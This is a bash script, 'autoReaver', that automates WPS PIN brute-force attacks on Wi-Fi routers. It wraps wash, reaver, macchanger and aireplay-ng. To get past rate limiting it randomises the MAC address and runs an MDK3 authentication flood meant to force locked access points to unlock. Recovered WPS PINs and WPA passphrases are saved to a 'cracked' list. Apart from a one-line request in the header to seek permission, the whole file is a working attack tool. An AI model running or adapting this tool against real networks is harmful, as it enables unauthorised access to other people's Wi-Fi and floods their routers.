#!/bin/bash

###################################################################################################################################################
###### I Know, another script to automate Reaver, bla, bla bla, bla....
###### This is a bash script that automates multiple AP attack using Reaver and a List of BSSIDs from a text file generated by Wash.
###### Remember to ask permission or use it with your onwn AP, be responsible. tested successfully with unpatched or older routers using  WPS 1.0.
###### More recent devices will lock you down (AP rate limit), in this case the script will try to unlock de AP using MDK3 Flood attacak,
###### if it succeeds it will continue to run reaver, otherwise it will loop to the next BSSID on the list.
###### Just execute the script, ./autoReaver, you will be prompt to select a WIFI device from a list of devices available,
###### WIFI devices info are retrieved from the path in Kali /sys/class/ieee80211
###### if at least one physical device is present inside ieee80211 directory, it will be present phy0 or phy(#) directory(s),
###### according to how many devices are plugged.
###### this works in Kali, in other distros if paths are different you must change them in configurationSetting file.
###### A Wash list is generated by Autoreaver, you will be asked to select 1 AP or ALL.
###### You can adjust some Reaver settings during the script execution or manually change them in configurationSettings file.
###### In the end, after it loops all BSSID list, the script will exit after stoping Monitor Mode, reseting device driver and
###### restarting Netwok Manager service, systemctl restart NetworkManager .
###### Found WPS-PIN And WPA-PSK are stored in CRACKED directory.
###################################################################################################################################################
###### REQUIREMENTS:
###### Reaver v1.6.6 (the version im using, dont know with older versions)
###### Macchanger
###### Airmon-ng, Aireplay-ng
###### Konsole
###### Wash
###################################################################################################################################################
###### DBus Server launch ERROR issue, please visit https://www.kali.org/docs/general-use/xfce-with-rdp/
###################################################################################################################################################

clear;

if [ $EUID -ne 0 ]; then
	echo "Please run as root!!!";
	exit;
fi

source $(pwd)"/configurationSettings";

###########################################################################################################################
###################################################### FUNCTIONS ##########################################################
###########################################################################################################################

echoWhite(){
	echo "$(tput setaf 7)${1}$(tput sgr0)";
}

echoBlue(){
	echo "$(tput setaf 4)${1}$(tput sgr0)";
}

echoRed(){
        echo "$(tput setaf 1)${1}$(tput sgr0)";
}

echoOrange(){
        echo "$(tput setaf 11)${1}$(tput sgr0)";
}

echoGreen(){
        echo "$(tput setaf 34)${1}$(tput sgr0)";
}

setDeviceSettings(){
        if [ ! -d "$PATH_IEEE" ] || [ ! "$(ls -A $PATH_IEEE)" ]; then
                echoWhite "---------------------------";
                echoRed "No WIFI Devices Detected!!!";
                echoWhite "---------------------------";
                echo "";
		exitAutoReaver;
	fi

	local COUNTDEV=0;
	local STR;
	local DRIVER;
	local LOGICAL;
	local PHY;
	local WIFICHOICE

	if [[ -f $DEVICE_LIST_FILE ]]; then
		$(rm $DEVICE_LIST_FILE)
	fi

	touch $DEVICE_LIST_FILE;

	echoBlue "#		Physical	Device          Driver";
	echoWhite "-----------------------------------------------------------"

	for PHY in $(ls $PATH_IEEE); do
		COUNTDEV=$((COUNTDEV+1));
	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c 5-${#STR});
	        LOGICAL=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
	        echoBlue "$COUNTDEV		$PHY		$LOGICAL        $DRIVER";
		echo "$PHY $LOGICAL $DRIVER" >> $DEVICE_LIST_FILE;
	done

	echo"";

	while true; do
	        read -p "Choose WIFI Device: " WIFICHOICE;

		if [[ $WIFICHOICE -le $COUNTDEV && $WIFICHOICE -ge 1 ]]; then
			WIFI_CARD_DRIVER=$(sed -n "$((WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $3 }');
			WIFI_CARD_LOGICAL=$(sed -n "$((WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $2 }');
			WIFI_CARD_PHY=$(sed -n "$(($WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $1 }');
			break;
		else
			echoOrange "InValid Selection...";
		fi
	done

	echo "";
	echoBlue "Checking if Selected Device is in Monitor Mode......";
	echo "";

	getMonitorName;

	if [ ! -z $WIFI_CARD_MONITOR  ]; then
		stopMonitor;
	fi

	sleep 2;
}

setAPSettings(){
	local WASH_OUTPUT;
	local AP;
	local APCHOICE;
	local YN;
	local SCANTIME;
	local CMD_WASH;
	local WASH_SCAN=0;
	local COUNTAP=0;

	if [[ -f $WASH_LIST_FILE && $RESCAN_AP -eq 0 ]]; then
		while true; do

			read -p "Use Last WASH Scan (Y/N)?" YN && echo "";

			case $YN in
				[Yy]* )
					WASH_SCAN=0;
					break;;
				[Nn]* )
					WASH_SCAN=1;
					break;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done
	else
		WASH_SCAN=1;
	fi

	if [[ $WASH_SCAN -eq 1 ]]; then
		while true; do
			read -p "AP Scan Time Set to $WASH_TIME Sec., Change (Y/N)? " YN;

			case $YN in
				[Yy]* )
					while true; do
						read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " SCANTIME

						if [[ $SCANTIME -ge 1 && $SCANTIME -le 120 ]]; then
							WASH_TIME=$SCANTIME;
							break;
						else
							echoOrange "Invalid Selection......";
						fi
					done
					;;
				[Nn]* )
					break;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done

		echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
		echoBlue "Please Wait...";
		echo "";

		CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $WASH_LIST_FILE";
		eval $CMD_WASH >>/dev/null;
	fi

	if [ $(awk 'END {print NR}' $WASH_LIST_FILE) -eq 2 ]; then
		echoRed "No Targets in AP List...";
		echoBlue "Try Increase WASH Scan Time...";

		while true; do
			read -p "ReScan APs (Y/N)? " YN;

			case $YN in
				[Yy]* )
					RESCAN_AP=1;
					setAPSettings;;
				[Nn]* )
					echoBlue "Exiting..."
					exitAutoReaver;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done
	fi

	while read -r WASH_OUTPUT; do
		COUNTAP=$((COUNTAP+1));

		case $COUNTAP in
			1)
				echoBlue "#	$WASH_OUTPUT";;
			2)
				echoWhite "$WASH_OUTPUT";;
			* )
				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) == "Yes" ]]; then
					echoRed "$((COUNTAP-2))	$WASH_OUTPUT";
				elif [[ $(awk '{ print $4 }' <<< $WASH_OUTPUT) == "2.0" ]]; then
					echoOrange "$((COUNTAP-2))	$WASH_OUTPUT";
				else
					echoGreen "$((COUNTAP-2))	$WASH_OUTPUT";
				fi
		esac
	done < "$WASH_LIST_FILE"
	echo "";

	while true; do
		read -p "Choose AP (1-$(($COUNTAP-2))), (0) to All, (R)escan : " APCHOICE;

		if [[ $APCHOICE -le $COUNTAP-2 && $APCHOICE -ge 1 ]]; then
			AP_BSSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $1 }');
			AP_CHANNEL=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $2 }');
			AP_ESSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $7 }');
			AP_WPS=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $4 }');
			AP_LOCK=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $5 }');
			break;
		else
			if [[ "$APCHOICE" == "0" ]]; then
				###### All option will allow this script to loop the wash output result
				echoRed "All... is Currently Unavailable. Please Select Single Target.";
			elif [[ "$APCHOICE" == "r" || "$APCHOICE" == "R" ]]; then
				clear;
				RESCAN_AP=1;
				setAPSettings;
				break;
			else
				echoOrange "Invalid Selection......";
			fi
		fi
	done

	RESCAN_AP=0;
}

setAutoReaverOpt(){
	local YN;
	local SEC
	local ATTEMPT;

	while true; do
        	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " YN;

		case $YN in
			[Yy]* )
				break;;
			[Nn]* )
				read -p "Please Enter New Fake Authentication Value: " SEC;

				if [[ $SEC -lt 61 && $SEC -gt 0 ]]; then
		                        FAKE_AUTH_DELAY_SECONDS=$SEC;
					break;
	       	       		else
	        	                echoOrange "Invalid Value...";
				fi;;
			* )
		esac
	done

        while true; do
                read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " YN;

                case $YN in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter PIN Attempts: " ATTEMPT;

                                if [ $ATTEMPT -gt 0 ]; then
                                        REAVER_PIN_ATTEMPTS=$ATTEMPT;
                                        break;
                                else
                                        echoOrange "Invalid Value...";
                                fi;;
                        * )
                esac
        done

        while true; do
                read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " YN;

                case $YN in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter New Attempt Delay Value: " SEC;

                                if [ $SEC -gt 0 ]; then
                                        REAVER_ATTEMPT_DELAY=$SEC;
                                        break;
                                else
                                        echoOrange "Invalid Value...";
                                fi;;
                        * )
                esac
        done

	while true; do
		echoWhite "Use Addiciotal Reaver Options:";
		echoWhite "-E: Terminate each WPS session with an EAP FAIL packet";
		echoWhite "-S: Use small DH keys to improve crack speed";
		echoWhite "-N: Do not send NACK messages when out of order packets are received";
		echoWhite "-T 1: Set the M5/M7 timeout period";
		echoWhite "-t 15: Set the receive timeout period";
		echoWhite "--win7: Mimic a Windows 7 registrar";

                read -p "(Y/N)? " YN;

                case $YN in
                        [Yy]* )
				ADDITIONAL_OPTIONS_YN="Yes";
                                break;;
                        [Nn]* )
				ADDITIONAL_OPTIONS_YN="No";
				break;;
                        * )
                esac
        done
}

reaverConfig(){
	local REAVER_OUTPUT;
}

checkLockStatus(){
	local CMD_LOCK_STATUS;
	local WASH_OUTPUT;
	local CHECK_LOCK_STATUS;

	echoBlue "Checking AP Lock Status......";

	if [[ ! -f $STATUS_FILE ]]; then
		touch $STATUS_FILE;
	fi

	CHECK_LOCK_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.LockStatus';
	touch $CHECK_LOCK_STATUS;

	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
	eval $CMD_LOCK_STATUS | {
		while read -r WASH_OUTPUT; do
			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") -eq 1 ]]; then
				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) == "Yes" ]]; then
					echo "AP_CHECK_STATUS_LOCKED" > $CHECK_LOCK_STATUS;
					break;
				else
					echo "AP_CHECK_STATUS_UNLOCKED" > $CHECK_LOCK_STATUS;
					break;
				fi
			else
				echo "AP_NOT_FOUND" > $CHECK_LOCK_STATUS;
			fi
		done

		echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_LOCK_STATUS)") >> $STATUS_FILE

		$(rm $CHECK_LOCK_STATUS);
	}

	case $(echo $CHECK_LOCK_STATUS) in
		["AP_CHECK_STATUS_LOCKED"]* )
			AP_LOCK="Yes";;
		["AP_CHECK_STATUS_UNLOCKED"]* )
			AP_LOCK="No";;
	esac

	case $AP_STATUS_FROM in
		[1]* ) ### AP Status Request by MDK3
			if [[ $(cat $MDK3_STATUS) -eq $MAX_CLIENTS ]]; then
				$(rm $MDK3_STATUS);
			else
				if [[ "$AP_LOCK" == "Yes" ]]; then
					echoRed "AP Is Still Locked......";
					unlockAP;
				fi
			fi
	esac
}

unlockAP(){
	local MDK3PID;
	local CMD_MDK3;
	local MDK3_OUTPUT;
	local CLIENT_COUNT;
	local LOOP_TARGET=0;

	if [[ ! -f $STATUS_FILE ]]; then
		touch $STATUS_FILE;
	fi

	if [[ ! -f $MDK3_STATUS ]]; then
		MDK3_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.MDK3';
	        touch $MDK3_STATUS;
	fi

	CMD_MDK3="mdk3 $WIFI_CARD_MONITOR  a -a $AP_BSSID -m";
	eval $CMD_MDK3 | {
		MDK3PID=$(ps | grep -i 'mdk3' | awk '{ print $1 }');
		LOOP_TARGET=$(($(cat $MDK3_STATUS)+$MAX_CLIENTS_TURN));
		echo "Loop Target $LOOP_TARGET Clients";

		while read -r MDK3_OUTPUT; do
			if [[ $(echo "$MDK3_OUTPUT" | grep -ic "Device is still responding with") -eq 1 ]]; then
				CLIENT_COUNT=$(echo "$MDK3_OUTPUT" | awk '{ print $6 }');
				echo $CLIENT_COUNT > $MDK3_STATUS;
				echo -ne "\r Device is still responding with $CLIENT_COUNT Clients Connected!";
				if [[ $CLIENT_COUNT -eq $LOOP_TARGET || $CLIENT_COUNT -eq $MAX_CLIENTS ]]; then
					break;
				fi
			fi
		done

		echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$LOOP_TARGET") >> $STATUS_FILE

		$(kill "$MDK3PID");
	}
	AP_STATUS_FROM=1;
	checkLockStatus;
}

getRandomMac(){
	sleep 1;

	ifconfig $WIFI_CARD_LOGICAL down;
	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......";
	WIFI_CARD_RNDMAC=$(macchanger -r $1 $WIFI_CARD_LOGICAL | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')")
	ifconfig $WIFI_CARD_LOGICAL up;
	echoGreen "$WIFI_CARD_LOGICAL New MAC Address $WIFI_CARD_RNDMAC......";
}

resetDeviceDriver(){
	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......";
	modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER

	sleep 1;

	checkIEEEPaths;
}

getMonitorName(){
	local FIND_MONITOR;

	FIND_MONITOR=$(iwconfig | grep -Ei "$WIFI_CARD_LOGICAL.*monitor")
	WIFI_CARD_MONITOR=$(awk '{ print $1 }' <<< "$FIND_MONITOR");
}

startMonitor(){
	echoBlue "Killing Processes Associated to AIRMON-NG......";

	local CMD_KILL;
	local MESSAGE;
	local CMD_START;

	if [[ $(airmon-ng check | grep -ic "pid") -gt 0 ]]; then
		CMD_KILL="airmon-ng check kill";
		eval $CMD_KILL >>/dev/null;
		echoGreen "Processes Killed......";
	else
		echoGreen "No Processes to Kill......";
	fi

	sleep 2;

	MESSAGE="Starting Monitor Mode on $WIFI_CARD_LOGICAL";

	if [ -z "$AP_CHANNEL" ]; then
		MESSAGE+="......";
	else
		MESSAGE+=" on Channel $AP_CHANNEL......";
	fi

	echoBlue "$MESSAGE";

	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
	eval $CMD_START >>/dev/null && getMonitorName && checkIEEEPaths;
}

stopMonitor(){
	local CMD_STOP;

	if [ -z "$WIFI_CARD_MONITOR" ]; then
		getMonitorName;
	fi

	if [ ! -z "$WIFI_CARD_MONITOR" ]; then
		echoBlue "Stopping Monitor Mode On $WIFI_CARD_LOGICAL......";
		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))";
		eval $CMD_STOP >>/dev/null && WIFI_CARD_MONITOR="" && checkIEEEPaths;
	fi
}

checkIEEEPaths(){
	local FOUND=0;
	local LOGICAL;
	local PHYSICAL;

	LOGICAL=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);

	for PHY in $(ls $PATH_IEEE); do
		PHYSICAL=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);

		if [ "$PHYSICAL" == "$LOGICAL" ]; then
			WIFI_CARD_PHY=$PHY;
			WIFI_CARD_LOGICAL=$PHYSICAL;
			FOUND=1;
		fi
	done

	if [ $FOUND -eq 0 ]; then
		echoRed "Something Went Wrong With WIFI Device......";
		echoBlue "Check Your WIFI Device(S).";
		exitAutoReaver;
	fi
}

checkRequisites(){
	local i;
	local CMD_COMMAND;
	local MISSING;
	local YN;

	unset option ARR_REQUISITES ERROR;
	declare -a ARR_REQUISITES="$REQUISITES";
	unset option MISS_REQUISITES ERROR;
	declare -a MISS_REQUISITES;

	echoBlue "Checking if AutoReaver Requisites are Present......";

	for (( i=0; i<${#ARR_REQUISITES[@]}; i++ )); do
		CMD_COMMAND=$(command -v "${ARR_REQUISITES[$i]}");

		if [ -z "$CMD_COMMAND" ]; then
			MISS_REQUISITES[${#MISS_REQUISITES[@]}]="${ARR_REQUISITES[$i]}";
		fi
	done

	unset ARR_REQUISITES;

	if [ ${#MISS_REQUISITES[@]} -gt 0 ]; then
		MISSING="${MISS_REQUISITES[@]}";
		echoRed "Following Requisites, $MISSING, are Missing......";

		while true; do
			read -p "Do You Want to Try to Install Missing Requisites (Y/N)? " YN;

			case $YN in
				[Yy]* )
					case "$(curl -s --max-time 2 -I $HTTP_CONN | sed 's/^[^ ]*  *\([0-9]\).*/\1/; 1q')" in
						[23]* )
							echoGreen "HTTP Connectivity is up......";

							for (( i=0; i<${#MISS_REQUISITES[@]}; i++ )); do
								echoBlue "Installing ${MISS_REQUISITES[$i]}......"

								CMD_COMMAND="sudo apt-get install ${MISS_REQUISITES[$i]} -y";
								eval $CMD_COMMAND;

								if [[ $? -gt 0 ]]; then
									echoRed "${MISS_REQUISITES[$i]} Failed to Install, Exiting......";
									exitAutoReaver;
								else
									echoGreen "${MISS_REQUISITES[$i]} Installed Successfuly......";
									sleep 2 && clear;
								fi
							done;;
						[5]* )
							echoRed "The Web Proxy Won't Let us Through......";
							echoBlue "Exiting......";
							exitAutoReaver;;
						* )
							echoOrange "The Network is Down or Very Slow......";
							echoBlue "Exiting......";
							exitAutoReaver;;
					esac

					break;;
				[Nn]* )
					echoBlue "Exiting......";
					exitAutoReaver;
					break;;
				* )
			esac
		done
	else
		echoGreen "All Requisites are Installed......";
		sleep 3;
	fi

	unset MISS_REQUISITES;
}

exitAutoReaver(){
	local netManagerStatus;

        if [ -z "$WIFI_CARD_MONITOR" ]; then
                getMonitorName;
        fi

        if [ ! -z "$WIFI_CARD_MONITOR" ]; then
		stopMonitor
        fi

	if [ ! -z "$WIFI_CARD_DRIVER" ]; then
		resetDeviceDriver;
	fi

	netManagerStatus=$(systemctl status NetworkManager | awk '{ print $2 }' <<< "$(grep -Ei 'Active:')");

	if [[ "$netManagerStatus" == "inactive" ]]; then
		echoBlue "Restarting Network Manager Service......";
		systemctl restart NetworkManager;
	fi

	exit 0;
}

###########################################################################################################################
###################################################### END FUNCTIONS ######################################################
###########################################################################################################################

if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
        echoRed "Configuration file: ./configurationSettings not present!!!";
        echoBlue "Try to recover this file, or download default version from project site, and try again";
	echo "";
        exitAutoReaver;
fi

if [[ ! -d "$REAVER_TMP_DIR" ]]; then
        mkdir -p -m 700 $REAVER_TMP_DIR;
fi

if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
        mkdir -p -m 700 $REAVER_SESSION_DIR;
fi

if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
        mkdir -p -m 700 $REAVER_CRACKED_DIR;
fi

checkRequisites;

clear;

while true; do
	PROCEED=0;

	echoWhite "Device Settings......";
	echo "";
	setDeviceSettings;
	clear;

	startMonitor;
	echoWhite "AP Settings......";
	echo "";
	setAPSettings;
	clear;

	echoWhite "AutoReaver Settings......";
	echo "";
	setAutoReaverOpt;
	clear;

	echoWhite "Device Settings --------------------------------------------------------------------";
	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
	echoBlue "Device Logical: 						$WIFI_CARD_LOGICAL";
	echoBlue "Device Physical:						$WIFI_CARD_PHY";
	echoBlue "Device Monitor:							$WIFI_CARD_MONITOR";
	echoWhite "AP Settings ------------------------------------------------------------------------";
	echoBlue "BSSID:								$AP_BSSID";
	echoBlue "Channel:							$AP_CHANNEL";
	echoBlue "WPS:								$AP_WPS";
	echoBlue "Lock State:							$AP_LOCK";
	echoBlue "ESSID:								$AP_ESSID";
	echoWhite "Reaver/Aireplay-ng Settings --------------------------------------------------------";
	echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
	echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
	echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
	echoBlue "Reaver Additional Options (-E -S -N -T 1 -t 15 --win7): 	$ADDITIONAL_OPTIONS_YN";
	echo "";

	while true; do
		read -p "Proceed (Y/N)?" yn;

		case $yn in
			[Yy]* )
				PROCEED=1;
				break;;
			[Nn]* )
				clear;
				break;;
			* )
				echoOrange "Please Answer Yes or No......";;
		esac
	done

	if [[ $PROCEED -eq 1 ]]; then
		PROCEED=0;
		break;
	fi
done

clear;

stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;

BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'

if [[ ! -f $STATUS_FILE ]]; then
	touch $STATUS_FILE;
	echoGreen "Status File for $AP_BSSID Created......";
else
	echoBlue "Status File for $AP_BSSID Found......";
fi

if [[ ! -f $CRACKED_LIST_FILE ]]; then
	touch $CRACKED_LIST_FILE;
	echoGreen "Cracked List File Created......";
else
	echoBlue "Cracked List File Found......";
fi

sleep 2;

while true; do
	#CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";

	eval $CMD_REAVER | {
		while read -r REAVER_OUTPUT; do

			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") -gt 0 ]]; then
				echoRed "[!] WARNING: Detected AP rate limiting......";
				echo $(date +"%d/%m/%Y %H:%M:%S AP_RATE_LIMITING") >> $STATUS_FILE
				$(killall -I reaver);
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") -gt 0 ]]; then
				echoGreen "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") -gt 0 ]]; then
				echoGreen "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") -gt 0 ]]; then
				echoRed "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S FAILED_TO_RECOVER_WPA_KEY") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") -gt 0 ]]; then
				echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S RECEIVE_TIMEOUT") >> $STATUS_FILE;
				$(killall -I reaver);
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") -gt 0 ]]; then
                                echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") -eq 1 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") -gt 0 ]]; then
				echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S $REAVER_OUTPUT") >> $STATUS_FILE;
			else
				echoBlue "$REAVER_OUTPUT";
			fi
		done
	}

	if [[ $(grep -icw 'ap_rate_limiting' $STATUS_FILE) -gt 0 ]]; then
		if [[ "$AP_LOCK" == "Yes" ]]; then
			echoRed "AP Locked......";
			echoOrange "Trying To Unlock AP......";

			unlockAP;

			if [[ "$AP_LOCK" == "Yes" ]]; then
				echoRed "Unlock AP Unsuccessful......";
				echoBlue "Try To Increase Max Clients Value In configurationSettings......";
				echoBlue "And Run Script Again......";
				break;
			fi
		else
			AP_STATUS_FROM=2;
			checkLockStatus;

			if [[ "$AP_LOCK" == "Yes" ]]; then
				echoRed "AP Locked......";
				echoOrange "Trying To Unlock AP......";
				unlockAP;

				if [[ "$AP_LOCK" == "Yes" ]]; then
					echoRed "Unlock AP Unsuccessful......";
					echoBlue "Try To Increase Max Clients Value In configurationSettings......";
					echoBlue "And Run Script Again......";
					break;
				fi
			else
				if [[ $REAVER_ATTEMPT_DELAY -ge $MAX_DELAY_PIN ]]; then
					echoRed "Delay Between PIN Attempt Reached $REAVER_ATTEMPT_DELAY Sec.";
					echoBlue "AP Is Not Locked, Try running the Script Again......";
					break;
				else
					REAVER_ATTEMPT_DELAY=$((REAVER_ATTEMPT_DELAY+30))
					echoBlue  "Reaver Delay Between PIN Attempt Increased to $REAVER_ATTEMPT_DELAY Sec.";
				fi
			fi
		fi
	elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) -gt 0 ]]; then
		while read -r STATUS_LINE; do
			if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") -gt 0 ]]; then
				WPA_PSK=$(awk '{ print $4 }' <<< $STATUS_LINE);
				WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
			elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") -gt 0 ]]; then
				WPS_PIN=$(awk '{ print $4 }' <<< $STATUS_LINE);
				WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
			fi
		done < "$STATUS_FILE"

		echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
		$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
		break;
	fi

	stopMonitor;
	resetDeviceDriver;
	getRandomMac;
        startMonitor;
done

exitAutoReaver;
